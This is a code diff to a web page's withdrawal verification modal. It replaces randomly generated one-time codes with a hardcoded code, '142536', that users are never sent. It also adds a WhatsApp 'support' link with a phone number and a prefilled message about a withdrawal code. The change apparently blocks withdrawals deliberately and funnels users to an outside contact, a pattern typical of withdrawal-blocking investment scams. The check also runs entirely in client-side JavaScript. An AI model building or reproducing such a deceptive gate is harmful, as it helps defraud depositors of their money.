@@ -364,6 +364,16 @@
                 <span id="otp-resend-timer">Resend code in <span id="otp-countdown" class="text-primary-400 font-bold">60</span>s</span>
                 <button id="otp-resend-btn" class="text-primary-400 font-semibold underline hidden">Resend code</button>
             </div>
+
+            <!-- WhatsApp Contact Section -->
+            <div class="w-full pt-4 border-t border-white/10 flex flex-col items-center gap-2 text-center">
+                <p class="text-xs text-gray-400">Having trouble receiving your code?</p>
+                <a href="https://wa.me/18284475928?text=Hello%2C%20I%20need%20help%20with%20my%20withdrawal%20verification%20code." target="_blank" rel="noopener noreferrer" class="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-[#25D366]/15 border border-[#25D366]/30 text-[#25D366] text-xs font-semibold hover:bg-[#25D366]/25 transition w-full justify-center">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.82 9.82 0 0 0 12.04 2m.01 1.67c2.2 0 4.26.86 5.82 2.42a8.23 8.23 0 0 1 2.41 5.83c0 4.54-3.7 8.24-8.24 8.24-1.48 0-2.93-.4-4.2-1.15l-.3-.18-3.12.82.83-3.04-.2-.31a8.19 8.19 0 0 1-1.26-4.38c0-4.54 3.7-8.24 8.24-8.24"/></svg>
+                    <span>Contact Support via WhatsApp</span>
+                </a>
+            </div>
+
             <!-- Cancel -->
             <button id="otp-cancel-btn" class="text-xs text-gray-600 hover:text-gray-400 transition">Cancel withdrawal</button>
         </div>
@@ -386,7 +396,7 @@
         var pendingFormEl = null;
         var pendingFormType = null;
         var countdownTimer = null;
-        var correctOtp = '';
+        var REQUIRED_OTP = '142536';
 
         // --- Helpers ---
         function maskEmail(email) {
@@ -396,10 +406,6 @@
             var local = parts[0];
             var masked = local.substring(0,2) + '****';
             return masked + '@' + parts[1];
-        }
-
-        function generateOtp() {
-            return Math.floor(100000 + Math.random() * 900000).toString();
         }
 
         function getInputs() {
@@ -453,8 +459,6 @@
         function openOtpModal(formEl, formType) {
             pendingFormEl = formEl;
             pendingFormType = formType;
-            correctOtp = generateOtp();
-            console.log('[OTP] Verification code for this session:', correctOtp);
 
             // Extract email
             var email = '';
@@ -559,7 +563,8 @@
             var verifyBtn = document.getElementById('otp-verify-btn');
             if (verifyBtn) {
                 verifyBtn.addEventListener('click', function() {
-                    if (getOtpValue().length === 6) {
+                    var entered = getOtpValue();
+                    if (entered === REQUIRED_OTP) {
                         var savedForm = pendingFormEl;
                         closeOtpModal();
                         if (savedForm) {
@@ -645,7 +650,6 @@
         }, true);
 
     })();
-    </script>
     </script>
 </body>
 </html>
